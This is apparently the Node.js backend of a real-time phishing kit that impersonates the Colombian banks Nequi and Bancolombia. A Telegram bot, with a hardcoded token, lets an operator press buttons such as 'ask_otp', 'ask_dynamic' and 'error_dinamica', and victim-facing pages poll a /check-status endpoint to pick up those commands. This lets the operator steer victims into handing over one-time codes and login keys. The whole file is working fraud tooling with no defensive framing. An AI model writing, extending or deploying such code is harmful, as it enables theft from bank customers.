const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

// --- CONFIGURACIÓN ---
const PORT_NEQUI = 3000;
const PORT_BANCOLOMBIA = 3001;
const TELEGRAM_TOKEN = '8164357624:AAF6-huSZNt6tU0Y-bOjkfac83GPh0gihJA';

// Comandos conocidos
const COMMANDS_NEQUI = ['finish', 'ask_dynamic', 'saldo_bad', 'wrong_user'];
const COMMANDS_BANCOLOMBIA = ['ask_logo', 'error_logo', 'ask_otp', 'error_dinamica'];

// Almacenamiento de comandos
let commandsNequi = null;
let commandsBancolombia = null;

// --- INICIAR BOT ---
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
console.log("🤖 Bot Unificado (Nequi + Bancolombia) iniciando...");

bot.on('callback_query', (callbackQuery) => {
    const data = callbackQuery.data;
    const chatId = callbackQuery.message.chat.id;
    
    console.log(`[Telegram] Clic recibido: ${data} (Chat: ${chatId})`);

    // Enrutar comando al banco correcto
    if (COMMANDS_NEQUI.includes(data)) {
        commandsNequi = data;
        console.log(`   -> Asignado a Nequi`);
    } else if (COMMANDS_BANCOLOMBIA.includes(data)) {
        commandsBancolombia = data;
        console.log(`   -> Asignado a Bancolombia`);
    } else {
        console.log(`   -> ⚠️ Comando desconocido, se ignorará.`);
    }

    bot.answerCallbackQuery(callbackQuery.id).catch(err => console.error(err));
});

bot.on('polling_error', (error) => {
    if (error.code === 'ETELEGRAM' && error.message.includes('409 Conflict')) {
        console.error("⚠️ Error de conflicto (409): Parece que hay otro bot corriendo.");
    } else {
        console.error(`[Polling Error] ${error.code}: ${error.message}`);
    }
});

// --- SERVIDOR NEQUI (Puerto 3000) ---
const appNequi = express();
appNequi.use(cors());
appNequi.use(bodyParser.json());
appNequi.use(express.static(path.join(__dirname, '.'))); // Servir archivos de Nequi

appNequi.get('/check-status', (req, res) => {
    if (commandsNequi) {
        res.json({ command: commandsNequi });
        console.log(`[Nequi Web] Comando entregado: ${commandsNequi}`);
        commandsNequi = null;
    } else {
        res.json({ command: null });
    }
});

appNequi.listen(PORT_NEQUI, () => {
    console.log(`✅ Servidor Nequi listo en http://localhost:${PORT_NEQUI}`);
});

// --- SERVIDOR BANCOLOMBIA (Puerto 3001) ---
const appBancolombia = express();
appBancolombia.use(cors());
appBancolombia.use(bodyParser.json());

appBancolombia.get('/check-status', (req, res) => {
    if (commandsBancolombia) {
        res.json({ command: commandsBancolombia });
        console.log(`[Bancolombia Web] Comando entregado: ${commandsBancolombia}`);
        commandsBancolombia = null;
    } else {
        res.json({ command: null });
    }
});

appBancolombia.listen(PORT_BANCOLOMBIA, () => {
    console.log(`✅ Servidor Bancolombia listo en http://localhost:${PORT_BANCOLOMBIA}`);
});
